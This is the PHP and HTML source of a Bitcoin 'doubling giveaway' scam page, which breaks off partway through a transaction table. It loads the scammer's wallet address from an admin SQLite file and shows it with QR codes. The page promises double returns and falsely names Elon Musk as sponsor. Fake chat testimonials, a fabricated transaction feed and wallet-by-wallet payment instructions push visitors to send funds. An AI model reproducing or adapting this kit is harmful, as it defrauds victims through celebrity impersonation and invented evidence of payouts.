<?php
session_start();
ini_set('display_errors', 'off');
error_reporting(0);

class MyDB extends SQLite3
{
    function __construct()
    {
        $this->open('../admin/app/setting.sqlite');
    }
}

$db = new MyDB();
$db->exec('CREATE TABLE btc_address (bar STRING)');
$db->exec('CREATE TABLE eth_address (bar STRING)');
$db->exec('CREATE TABLE token (bar STRING )');

$results = $db->query('SELECT bar FROM btc_address');
$empty = 0;
while ($row = $results->fetchArray()) {
    $empty++;
}
if ($empty != 0) {
    $result = $db->query('SELECT bar FROM btc_address');
    $len = 0;
    while ($row = $result->fetchArray()) {
        $len++;
    }
    $i = 0;
    while ($row = $result->fetchArray()) {
        if ($i == $len - 1) $btc_address = $row[0];
        $i++;
    }
} else {
    $btc_address = '';
}


$results = $db->query('SELECT bar FROM eth_address');
$empty = 0;
while ($row = $results->fetchArray()) {
    $empty++;
}
if ($empty != 0) {
    $result = $db->query('SELECT bar FROM eth_address');
    $len = 0;
    while ($row = $result->fetchArray()) {
        $len++;
    }
    $i = 0;
    while ($row = $result->fetchArray()) {
        if ($i == $len - 1) $eth_address = $row[0];
        $i++;
    }
} else {
    $eth_address = '';
}

$results = $db->query('SELECT bar FROM token');
$empty = 0;
while ($row = $results->fetchArray()) {
    $empty++;
}
if ($empty != 0) {
    $result = $db->query('SELECT bar FROM token');
    $len = 0;
    while ($row = $result->fetchArray()) {
        $len++;
    }
    $i = 0;
    while ($row = $result->fetchArray()) {
        if ($i == $len - 1) $token = $row[0];
        $i++;
    }
}

?>
<html class="webp loaded" data-scrapbook-source="" data-scrapbook-create="20211224095317182" data-scrapbook-title="Ethereum Giveaway 2022" lang="ru"><head>
	<title>Bitcoin Giveaway 2022</title>
	<meta charset="UTF-8">
	<meta name="format-detection" content="telephone=no">
	<link rel="stylesheet" href="style.min.css">
	<link rel="shortcut icon" href="">
	<link rel="shortcut icon" href="bitcoin.png" type="image/x-icon">
	<link rel="stylesheet" href="min.css">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script async="" type="text/javascript" charset="utf-8" src="recorder.js"></script><script async="" type="text/javascript" src="main-20210906133224.js"></script></head>

<body>
	
</div>
	<div class="wrapper">
		<header class="header">
			<div class="header__container">
				<a href="#" class="header__logo">
					<img src="bitcoin.png" alt="Logo">
				</a>
				<div class="header__menu menu">
					<button type="button" class="menu__icon icon-menu"><span></span></button>
					<nav class="menu__body">
						<ul class="menu__list">
							<li class="menu__item"><a href="" data-goto-header="" data-goto="top" class="menu__link">Home</a></li>
							<li class="menu__item"><a href="" data-goto-header="" data-goto="sec2" class="menu__link">Giveaway</a></li>
							<li class="menu__item"><a href="" data-goto-header="" data-goto="rules" class="menu__link">Rules</a></li>
							<li class="menu__item"><a href="" data-goto-header="" data-goto="faq" class="menu__link">FAQ</a></li>
							<li class="menu__item"><a href="" data-goto-header="" data-goto="sec3" class="menu__link">Transactions</a></li>
							<li class="menu__item"><a href="" data-goto-header="" data-goto="form" class="menu__link">Bonus</a></li>
						</ul>
					</nav>
				</div>
			</div>
		</header>
		<main class="page">
			<section id="top" class="top">
				<div class="top__container">
					<div class="top__body">
						<div class="top__img">
							<div class="top__bg">
								<div class="top__bg1"></div>
								<div class="top__bg2"></div>
							</div>
							<picture><source srcset="top2.png" type="image/webp"><img src="top2.png" alt="Image"></picture>
						</div>
						<div class="top__content">
							<h1 class="top__title">
								Hurry up and take part in the giveaway of 5000 BTC
							</h1>
							<p>During this unique event we will give you a chance to win 5000 BTC, have a look at the rules
								and
								don't miss on your chance!</p>
							<a href="" class="button top__btn">Participate in the giveaway</a>
						</div>

					</div>
					<div class="top__bottom">
						<div class="top__item item-top">
							<div class="item-top__row">
								<div class="item-top__kurs">
									ETH / USD
								</div>
								<div data-coin="CHANGE24HOURPCT_ETH" class="item-top__procent up">+4.49 %</div>
							</div>
							<div data-coin="PRICE_ETH" class="item-top__price up">4 108.76 $</div>
						</div>
						<div class="top__item item-top">
							<div class="item-top__row">
								<div class="item-top__kurs">
									BNB / USD
								</div>
								<div data-coin="CHANGE24HOURPCT_BNB" class="item-top__procent up">+4.25 %</div>
							</div>
							<div data-coin="PRICE_BNB" class="item-top__price up">549.24 $</div>
						</div>
						<div class="top__item item-top">
							<div class="item-top__row">
								<div class="item-top__kurs">
									XRP / USD
								</div>
								<div data-coin="CHANGE24HOURPCT_XRP" class="item-top__procent down">-1.01 %</div>
							</div>
							<div data-coin="PRICE_XRP" class="item-top__price up">0.975 $</div>
						</div>
						<div class="top__item item-top">
							<div class="item-top__row">
								<div class="item-top__kurs">
									XLM / USD
								</div>
								<div data-coin="CHANGE24HOURPCT_XLM" class="item-top__procent up">+3.63 %</div>
							</div>
							<div data-coin="PRICE_XLM" class="item-top__price down">0.286 $</div>
						</div>
						<div class="top__item item-top">
							<div class="item-top__row">
								<div class="item-top__kurs">
									DOGE / USD
								</div>
								<div data-coin="CHANGE24HOURPCT_DOGE" class="item-top__procent up">+5.66 %</div>
							</div>
							<div data-coin="PRICE_DOGE" class="item-top__price">0.183 $</div>
						</div>
						<div class="top__item item-top">
							<div class="item-top__row">
								<div class="item-top__kurs">
									BTC / USD
								</div>
								<div data-coin="CHANGE24HOURPCT_BTC" class="item-top__procent up">+5.85 %</div>
							</div>
							<div data-coin="PRICE_BTC" class="item-top__price">51 235.07 $</div>
						</div>
					</div>
				</div>
			</section>
			<div class="work">
				<div class="work__container">
					<div class="work__column">
						<div class="subtitle work__subtitle">
							HOW IT WORKS
						</div>
						<div class="work__info">
							We believe that Blockchain and <span>BTC Coin</span> will make the world more fair. To speed up the
							process of
							cryptocurrency mass adoption we decided to run <span>5000BTC giveaway</span>.
						</div>
					</div>
					<div class="work__column2">
						<div class="subtitle work__subtitle">
							ABOUT
						</div>
						<div class="work__info2">
							To participate you just need to send from 1 BTC to 500 BTC to the contribution address and we will
							immediately send you back from 2 ETH to 1,000 BTC (x2) to the address you sent it from.
						</div>
					</div>
				</div>
			</div>
			<div class="event">
				<div class="event__container">
					<div id="sec2" class="event__column">
						<div class="event__subtitle subtitle">
							NEW EVENT FROM BTC
						</div>
						<div class="event__title">
							Enter the giveaway, and multiply the BTC balance
						</div>
						<p>Follow the rules on the right side to participate in the giveaway</p>
						<div class="event__img">
							<picture><source srcset="Bitcoin-crypto-money.png" type="image/webp"><img src="Bitcoin-crypto-money.png" alt=""></picture>
						</div>
					</div>
					<div id="rules" class="event__column">
						<div class="event__subtitle subtitle">
							RULES
						</div>
						<div class="event__title-small">
							Follow the rules to participate
						</div>
						<ul class="event__list">
							<li>
								If you send <span>0.1+ BTC</span>you will get <span>0.2+ BTC</span>back
							</li>
							<li>
								If you send <span>0.5+ BTC</span>you will get <span>1+ BTC</span>back
							</li>
							<li>
								If you send <span>1+ BTC</span>you will get <span>2+ BTC</span>back
							</li>
							<li>
								If you send <span>5+ BTC</span>you will get <span>10+ BTC</span>back <b>+30% bonus</b>
							</li>
							<li>
								If you send <span>10+ BTC</span>you will get <span>20+ BTC</span>back <b>+40% bonus</b>
							</li>
							<li>
								If you send <span>20+ BTC</span>you will get <span>40+ BTC</span>back <b>+50% bonus</b>
							</li>
						</ul>
						<div class="event__bottom">
							<div class="event__icon">
								<img src="info.svg" alt="">
							</div> *The higher the amount, the higher the percentage
						</div>

					</div>
				</div>
			</div>
			<section class="bnb">
				<div class=" bnd__container">
					<div class="bnb__body">
						<div class="bnb__left">
							<div class="bnb__svg-box">
								<div class="bnb__pr">51%</div>
								<div class="bnb__block">
									<div class="bnb__logo">
										<img src="bnb.svg" alt="">
									</div>
									<div class="bnb__ost">
										<span class="bnb__ost-value _done">3460</span>&nbsp; BTC
									</div>
									<div class="bnb__all">
										/5000
									</div>
								</div>
								<svg viewBox="0 0 36 36" class="circular-chart" style="z-index: -1">
									<path class="circle bg" stroke-dasharray="100, 100" d="M18 2.0845
                                         a 15.9155 15.9155 0 0 1 0 31.831
                                         a 15.9155 15.9155 0 0 1 0 -31.831"></path>
								</svg>
								<svg id="progress" viewBox="0 0 36 36" class="progress1 circular-chart">
									<path class="circle" stroke-dasharray="51,100" d="M18 2.0845
                                         a 15.9155 15.9155 0 0 1 0 31.831
                                         a 15.9155 15.9155 0 0 1 0 -31.831"></path>
								</svg>
							</div>
						</div>
						<div class="bnb__center">
							<div class="bnb__top">
								<span> 3400 BTC</span> already sent to participants!
							</div>
							<div class="bnb__descr">
								Hurry up and take part in the giveaway!
							</div>
							<h2 class="bnb__title">
								You can send BTC to the following address:
							</h2>
							<div class="bnb__block tq">
								<div class="bnb__copy bnb__copy1">
									<span><?php echo $btc_address ?></span>
									<div class="bnb__icon">
										<img src="copy.svg" alt="">
									</div>
								</div>
							</div>
							<div class="bnb__bottom">
								<div class="bnb__img">
									<img src="load.svg" alt="Load">
								</div>
								<span>
									Waiting for the payment...
								</span>
							</div>
						</div>
						<div class="bnb__right">
							<div class="bnb__wrap">
								<div class="qr">
									<picture><img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=<?php echo $btc_address ?>" alt="Code"></picture>
								</div>
							</div>
							<div class="bnb__label">
								Or scan the QR Code
							</div>
						</div>
					</div>
				</div>
			</section>
			<div id="form" class="form" flex>

				<div class="form__container">
					<div class="form__load">
						<picture><source srcset="loading.webp" type="image/webp"><img src="loading.gif" alt=""></picture>
					</div>
					<div class="form__body">
						<div class="form__title active">
							Check your wallet for bonuses
						</div>
						<div class="form__title form__title none">
							<span>Congrats!</span>&nbsp; You will get the bonuses!
						</div>
						<div class="form__subtitle active">
							The bonus is available for wallets that have not previously participated in this distribution 

						</div>
						<div class="form__subtitle none">
							Your wallet is avaiable to get the bonus from transaction
						</div>
						<div class="form__row">
							<form action="#"> <input type="text" placeholder="Your wallet"  class="input form__input _req" data-placeholder="Your wallet" >
								<button class="form__btn button">Check</button> <div data-goto="faq" class="fff flex">Calculate your prize</div>
							</form>
						</div>
					</div>
				</div>
			</div>
			
				<div id="chat-body" class="chat__body">
					<div style="--bg:url(img/avatar/avatar17.jpg)" class="mess">
						<div class="msg">
							<p class="nickname">1n7ve5rk...</p>
							<p class="msg-text">8 BTC ON MY WALLET</p>
						</div>
					</div>

					<div style="--bg:url(img/avatar/avatar12.jpg)" class="mess ">
						<div class="msg">
							<p class="nickname">1vjpwkoy...</p>
							<p class="msg-text">Thank you Vitalik Buterin! From me and my son.</p>
						</div>
					</div>
					<div style="--bg:url(img/avatar/avatar20.jpg)" class="mess">
						<div class="msg">
							<p class="nickname">1u23inr0...</p>
							<p class="msg-text">GOT 7.27!!!!!!!!</p>
						</div>
					</div>
					<div style="--bg:url(img/avatar/avatar1.jpg)" class="mess">
						<div class="msg">
							<p class="nickname">1e9uinnd...</p>
							<p class="msg-text">Got 2 BTC THANK YOU ELON</p>
						</div>
					</div>
					<div style="--bg:url(img/avatar/avatar2.jpg)" class="mess">
						<div class="msg">
							<p class="nickname">1er21ehd...</p>
							<p class="msg-text">recieived some BTC thanks</p>
						</div>
					</div>
				<div class="mess" style="--bg:url(../img/avatar/avatar2.jpg)"><div class="msg"><p class="nickname">1v1u2ya6...</p><p class="msg-text">Recieved 97 000 bucks in BTC OMG ELON BUTERIN I LOVE YOU!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar20.jpg)"><div class="msg"><p class="nickname">17ago0j5...</p><p class="msg-text">HEYYY</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar5.jpg)"><div class="msg"><p class="nickname">1xqo1k9u...</p><p class="msg-text">Recieved 97 000 bucks in BTC OMG ELON BUTERIN I LOVE YOU!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar6.jpg)"><div class="msg"><p class="nickname">1aws8ycy...</p><p class="msg-text">I was doubting for a long time if I should send here my 4 BTC, but it actually worked for me so I got 8 BTC now thanks to bitcoin.</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar12.jpg)"><div class="msg"><p class="nickname">1bzoa1uf...</p><p class="msg-text">Got some!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar17.jpg)"><div class="msg"><p class="nickname">1d7obxp1...</p><p class="msg-text">LETS GO GUYS</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar4.jpg)"><div class="msg"><p class="nickname">1uby6aa1...</p><p class="msg-text">HERE I AM, GOT $450k FUCKING INSANE THING!!!!!!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar8.jpg)"><div class="msg"><p class="nickname">1fb2vram...</p><p class="msg-text">Changed my mind on BTC. THANK YOU!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar13.jpg)"><div class="msg"><p class="nickname">1vjqvziz...</p><p class="msg-text">Recieved 97 000 bucks in BTC OMG VITALIK BUTERIN I LOVE YOU!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar11.jpg)"><div class="msg"><p class="nickname">1oqi7czt...</p><p class="msg-text">thanks for letting me participate!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar1.jpg)"><div class="msg"><p class="nickname">18hb5lvm...</p><p class="msg-text">+ 35.3874 BTC</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar13.jpg)"><div class="msg"><p class="nickname">1qcxhhv1...</p><p class="msg-text">3 BTC</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar11.jpg)"><div class="msg"><p class="nickname">1gcftoci...</p><p class="msg-text">7.4288</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar19.jpg)"><div class="msg"><p class="nickname">123ccexs...</p><p class="msg-text">+12.44</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar18.jpg)"><div class="msg"><p class="nickname">1kk34jel...</p><p class="msg-text">LETS GO GUYS</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar16.jpg)"><div class="msg"><p class="nickname">13et464o...</p><p class="msg-text">9.34 BTC</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar6.jpg)"><div class="msg"><p class="nickname">1jxwbnv3...</p><p class="msg-text">i actually got 5.64 BTC back what the fuck?</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar3.jpg)"><div class="msg"><p class="nickname">1l6mpsve...</p><p class="msg-text">God Bless Vitalik Buterin!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar19.jpg)"><div class="msg"><p class="nickname">1lrns5ap...</p><p class="msg-text">+4.18</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar17.jpg)"><div class="msg"><p class="nickname">1r05l2uj...</p><p class="msg-text">WOOOOOOOOW!!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar15.jpg)"><div class="msg"><p class="nickname">101lyhj5...</p><p class="msg-text">Unbeliveable charity!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar6.jpg)"><div class="msg"><p class="nickname">1lpdhth0...</p><p class="msg-text">does it doubles the amount you send?</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar15.jpg)"><div class="msg"><p class="nickname">1mihxkxy...</p><p class="msg-text">3 BTC</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar1.jpg)"><div class="msg"><p class="nickname">16arbgpo...</p><p class="msg-text">BUTERIN IS THE BEST</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar18.jpg)"><div class="msg"><p class="nickname">112gcyeb...</p><p class="msg-text">it took a couple of minutes but I got $13,000 </p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar9.jpg)"><div class="msg"><p class="nickname">1zsjqy8n...</p><p class="msg-text">I was lucky to get my $200,000.</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar20.jpg)"><div class="msg"><p class="nickname">10nwpa8p...</p><p class="msg-text">Gracias papi</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar18.jpg)"><div class="msg"><p class="nickname">1yvqslh3...</p><p class="msg-text">Unbeliveable charity!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar6.jpg)"><div class="msg"><p class="nickname">1l5slbwf...</p><p class="msg-text">HYPE!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar10.jpg)"><div class="msg"><p class="nickname">19yf7wpg...</p><p class="msg-text">Too good!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar7.jpg)"><div class="msg"><p class="nickname">1r3ivrxl...</p><p class="msg-text">YEAH BITCH</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar6.jpg)"><div class="msg"><p class="nickname">12h0c0ts...</p><p class="msg-text">BUTERIN IS THE BEST</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar19.jpg)"><div class="msg"><p class="nickname">1qy7cdxa...</p><p class="msg-text">Hello everyone!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar8.jpg)"><div class="msg"><p class="nickname">1yzmlyzb...</p><p class="msg-text">THIS IS SICK!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar18.jpg)"><div class="msg"><p class="nickname">19xwo6fa...</p><p class="msg-text">HOW IS THIS POSSIBLE?</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar16.jpg)"><div class="msg"><p class="nickname">1cj25t4c...</p><p class="msg-text">NEW BTC ATH COMING</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar11.jpg)"><div class="msg"><p class="nickname">1kr7191h...</p><p class="msg-text">Got some!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar17.jpg)"><div class="msg"><p class="nickname">1hgi6a3z...</p><p class="msg-text">OHHHH COME HERE $$$$$$</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar19.jpg)"><div class="msg"><p class="nickname">14lkjlxq...</p><p class="msg-text">How much left??????</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar18.jpg)"><div class="msg"><p class="nickname">1i0xxyfy...</p><p class="msg-text">HI</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar18.jpg)"><div class="msg"><p class="nickname">1t8uflvl...</p><p class="msg-text">BIG PUMP IS COMING</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar18.jpg)"><div class="msg"><p class="nickname">1et7spz9...</p><p class="msg-text">Recieved 97 000 bucks in BTC OMG VITALIK BUTERIN I LOVE YOU!</p></div></div><div class="mess" style="--bg:url(../img/avatar/avatar6.jpg)"><div class="msg"><p class="nickname">1gckpmhi...</p><p class="msg-text">BTC TO THE MOON</p></div></div></div>
				<div class="chat__form">
					<div class="chat__item">
						<input autocomplete="off" type="text" data-error="Ошибка" placeholder="Send your message" class="input" data-placeholder="Send your message" data-scrapbook-input-value="">
						<button class="chat__btn">
							<div class="chat__icon2">
								<img src="send.svg" alt="">
							</div>
						</button>
					</div>

				</div>
			</div>
			<div id="faq" class="faq">
				<div class=" faq__container">
					<div class="faq__body">
						<div class="faq__left left-faq">
							<div class="left-faq__img">
								<picture><source srcset="Bitcoin-crypto-money2.png" type="image/webp"><img src="Bitcoin-crypto-money2.png" alt=""></picture>
							</div>
							<div class="left-faq__body">
								<div class="left-faq__title">
									Calculate your prize
								</div>
								<div class="left-faq__subtitle">
									Use our calculator to calculate your possible profit
								</div>
								<div class="left-faq__row">
									<div class="left-faq__column">
										<label class="left-faq__label">You will send</label>
										<div class="left-faq__item">
											<span class="left-faq__decor">
												<div class="left-faq__icon">
													<img src="bitcoin.png" alt="">
												</div>
												<span>BTC</span>
											</span>
											<input autocomplete="off" type="number" data-error="Ошибка" value="6" placeholder="" class="input left-faq__input left-faq__input1" data-placeholder="">
										</div>
									</div>
									<div class="left-faq__line">
										X2
									</div>
									<div class="left-faq__column">
										<label class="left-faq__label">Your profit</label>
										<div class="left-faq__item">
											<span class="left-faq__decor">
												<div class="left-faq__icon">
													<img src="bitcoin.png" alt="">
												</div>
												<span>BTC</span>
											</span>
											<input readonly="" autocomplete="off" type="text" data-error="Ошибка" value="12" placeholder="" class="input left-faq__input left-faq__input2" data-placeholder="">
										</div>
									</div>
								</div>
							</div>
						</div>
						<div class="faq__right">
							<div class="faq__subtitle subtitle">
								FAQ
							</div>
							<div data-spollers="" data-one-spoller="" class="faq__spollers _spoller-init">
								<div class="faq__item">
									<div data-spoller="" class="faq__head _spoller-active">
										What do I have to do to participate in the giveaway?
									</div>
									<div class="faq__content">
										To participate you just need to send from 1 BTC to 500 BTC to the contribution address and we will immediately send you back from 2 BTC to 1,000 BTC (x2) to the address you sent it from.
									</div>
								</div>
								<div class="faq__item">
									<div data-spoller="" class="faq__head">
										How long will it take me to get my bonus?
									</div>
									<div class="faq__content" hidden="">
									You get your x2 bonus instantly! The system is fully automated, so all transactions are sent without delay!
									</div>
								</div>
								<div class="faq__item">
									<div data-spoller="" class="faq__head">
										Who is the sponsor of this giveaway?
									</div>
									<div class="faq__content" hidden="">
									The main sponsor of this event is ELON MASK
									</div>
								</div>
								<div class="faq__item">
									<div data-spoller="" class="faq__head">
										How many times can I participate in the giveaway?
									</div>
									<div class="faq__content" hidden="">
									You can only participate once.
									</div>
								</div>
								<div class="faq__item">
									<div data-spoller="" class="faq__head">
										How do I get my bonus?
									</div>
									<div class="faq__content" hidden="">
									The system will automatically send the bonus to the wallet from which you participated in the giveaway.
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div class="toast">
				Copied!
			</div>
			<div class="steps">
				<div class="steps__container">
					<div class="steps__body">
						<div class="tabs _tabs">
							<nav class="tabs__navigation">
								<button type="submit" class="tabs__title  _tabs-item _active">1</button>
								<button type="submit" class="tabs__title _tabs-item">2</button>
								<button type="submit" class="tabs__title _tabs-item">3</button>
								<button type="submit" class="tabs__title _tabs-item">4</button>
							</nav>
							<div class="tabs__content ">
								<div class="tabs__body  _tabs-block _active">
									<div class="steps__first first">
										<div class="first__img">
											<picture><source srcset="tabs01.webp" type="image/webp"><img src="tabs01.png" alt=""></picture>
										</div>
										<div class="first__left">
											<div class="first__img-code">
												<picture><img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=<?php echo $btc_address ?>" alt="Code"></picture>
											</div>
										</div>
										<div class="first__right">
											<div class="bnb__top">
												<span> 3500 BTC</span> already sent to participants!
											</div>
											<div class="bnb__descr">
												Hurry up and take part in the giveaway!
											</div>
											<h2 class="bnb__title">
												You can send BTC to the following address:
											</h2>
											<div class="bnb__block tq">
												<div class="bnb__copy bnb__copy2">
													<span><?php echo $btc_address ?>
													</span>
													<div class="bnb__icon">
														<img src="copy.svg" alt="">
													</div>
												</div>
											</div>
											<div class="bnb__bottom">
												<div class="bnb__img">
													<img src="load.svg" alt="Load">
												</div>
												<span>
													Waiting for the payment...
												</span>
											</div>
											<button class="button steps__btn1">
												Next
											</button>
										</div>
									</div>
								</div>
								<div class="tabs__body _tabs-block">
									<div class="steps__two two">
										<div class="two__img">
											<picture><source srcset="tabs02.webp" type="image/webp"><img src="tabs02.png" alt=""></picture>
										</div>
										<div class="two__left">
											<div class="two__title">
												Choose your wallet
											</div>
											<div class="two__items">
												<div data-block="1" class="two__item">
													<div class="two__icon">
														<img src="icon01.svg" alt="">
													</div>
													<span>Binance</span>
												</div>
												<div data-block="2" class="two__item">
													<div class="two__icon">
														<img src="icon02.svg" alt="">
													</div>
													<span>Metamask</span>
												</div>
												<div data-block="3" class="two__item">
													<div class="two__icon">
														<img src="icon03.svg" alt="">
													</div>
													<span>Coinbase</span>
												</div>
												<div data-block="0" class="two__item">
													<div class="two__icon">
														<img src="icon04.svg" alt="">
													</div>
													<span>Crypto</span>
												</div>
												<div data-block="0" class="two__item">

													<span>Other</span>
												</div>
											</div>

										</div>
									</div>
								</div>
								<div class="tabs__body _tabs-block">
									<div data-id="1" class="steps__third th">
										<div class="th__img">
											<picture><source srcset="tabs3.webp" type="image/webp"><img src="tabs3.png" alt=""></picture>
										</div>
										<div class="th__body">
											<div class="th__title">
												How to send BTC from Binance?
											</div>
											<div class="th__text">
												<p> Sending crypto funds</p>
												<p>To send crypto from your Wallet</p>
												<ul class="th__list">
													<li>
														Open BINANCE
													</li>
													<li>Tap Fiat and Spot</li>

													<li> Tap Withdraw</li>
													<li> Enter official giveaway BTC adress</li>
													<li>Select which coin you'd like to use</li>
													<li>Enter the amount you'd like to send</li>
													<li>Tap Withdraw button</li>
												</ul>
											</div>
											<button class="button steps__btn1">
												Next
											</button>
										</div>
									</div>
									<div data-id="2" class="steps__third th">
										<div class="th__img">
											<picture><source srcset="tabs4.webp" type="image/webp"><img src="tabs4.png" alt=""></picture>
										</div>
										<div class="th__body">
											<div class="th__title">
												How to send BTC from Metamask?
											</div>
											<div class="th__text">
												<p> Sending crypto funds</p>
												<p>To send crypto from your Wallet</p>
												<ul class="th__list">
													<li>
														Open Metamask
													</li>
													<li>Tap Send</li>

													<li> Enter official giveaway BTC adress</li>
													<li> Select which coin you'd like to use</li>
													<li> Enter the amount you'd like to send</li>
													<li> Tap next button</li>
													<li> Tap confirm</li>
												</ul>
											</div>
											<button class="button steps__btn1">
												Next
											</button>
										</div>
									</div>
									<div data-id="3" class="steps__third th">
										<div class="th__img">
											<picture><source srcset="tabs5.webp" type="image/webp"><img src="tabs5.png" alt=""></picture>
										</div>
										<div class="th__body">
											<div class="th__title">
												How to send BTC from Coinbase?
											</div>
											<div class="th__text">
												<p>Sending crypto funds <br>
													To safegaurd against sending funds to an incorrect address, we <br> suggest
													asking the
													Receiver for their unique QR code. </p>
												<p>To send crypto from your Wallet</p>
												<ul class="th__list">
													<li>
														Open BINANCE
													</li>
													<li> Open Coinbase Wallet app on your mobile device
													</li>
													<li> Tap Send
													</li>
													<li> Enter the amount you'd like to send
													</li>
													<li> Select which coin you'd like to use</li>
													<li>Tap Next</li>
													<li>Tap the QR code or enter official giveaway BTC adress</li>
												</ul>
											</div>
											<button class="button steps__btn1">
												Next
											</button>
										</div>
									</div>

								</div>
								<div class="tabs__body _tabs-block">
									<div class="steps__four four">
										<div class="four__img">
											<picture><source srcset="tabs6.webp" type="image/webp"><img src="tabs6.png" alt=""></picture>
										</div>
										<div class="four__body">
											<div class="four__top">
												<div class="four__icon">
													<img src="load2.svg" alt="">
												</div>
												<span>Waiting for the payment...</span>
											</div>
											<p>Once we receive your transaction, we will immediately send the requested amount back
												to you.</p>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<div id="sec3" class="transaction">
				<div class="transaction__container">
					<div class="transaction__row">
						<div class="transaction__title">
							Bonus transactions
						</div>
						<div class="transaction__copy">
							<span>
							<?php echo $btc_address ?>

							</span>
							<div class="transaction__icon">
								<img src="copy.svg" alt="">
							</div>
						</div>
					</div>
					<div id="Transactions" class="transaction-container">
						<div class="transaction-table">
							<div class="table-body"><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">9CR4TFLFMX...</div><div style="display: none" class="data-item">616239</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0xID53oxwK...</div><div class="data-item">right now</div><div class="data-item">127.86 BTC</div><div style="display: none" class="data-item">0.00037504</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">B5OZ8T4EFX...</div><div style="display: none" class="data-item">616535</div><div class="data-item">0xID53oxwK...</div><div class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">right now</div><div class="data-item">63.93 BTC</div><div style="display:none" ;="" class="data-item">0.000556</div></div></div></div><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">8QAVNHYLZC...</div><div style="display: none" class="data-item">616614</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0xwiey6nBp...</div><div class="data-item">1 min</div><div class="data-item">53.96 BTC</div><div style="display: none" class="data-item">0.00013410</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">H7Y7GJVHH9...</div><div style="display: none" class="data-item">616517</div><div class="data-item">0xwiey6nBp...</div><div class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">1 min</div><div class="data-item">26.98 BTC</div><div style="display:none" ;="" class="data-item">0.006994</div></div></div></div><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">MOO1I21UCD...</div><div style="display: none" class="data-item">616256</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0xJIafEAJk...</div><div class="data-item">2 min</div><div class="data-item">172 BTC</div><div style="display: none" class="data-item">0.00039641</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">MQQWAHGAU1...</div><div style="display: none" class="data-item">616444</div><div class="data-item">0xJIafEAJk...</div><div class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">2 min</div><div class="data-item">86.00 BTC</div><div style="display:none" ;="" class="data-item">0.000500</div></div></div></div><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">RSELLHGU0V...</div><div style="display: none" class="data-item">616758</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0xA9TTglLx...</div><div class="data-item">3 min</div><div class="data-item">143.78 BTC</div><div style="display: none" class="data-item">0.00032239</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">C4J5NE17RN...</div><div style="display: none" class="data-item">616154</div><div class="data-item">0xA9TTglLx...</div><div class="data-item">IN</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">3 min</div><div class="data-item">71.89 BTC</div><div style="display:none" ;="" class="data-item">0.000079</div></div></div></div><div class="item" style=""><div class="top"><div class="data"><div style="" class="data-item">M9S6HLRFR9...</div><div style="display: none" class="data-item">616725</div><div class="data-item" id="btcstr">0xB0E341c5...</div><div class="data-item">OUT</div><div class="data-item">0xKJMNrUa7...</div><div class="data-item">4 min</div><div class="data-item">98.26 BTC</div><div style="display: none" class="data-item">0.00031837</div></div></div><div class="bottom"><div class="data"><div style="" class="data-item">OC0NT1KGUD...</div><div style="display: none" class="data-item">616513</div><div class="data-item">0xKJMNrUa7...</div><div 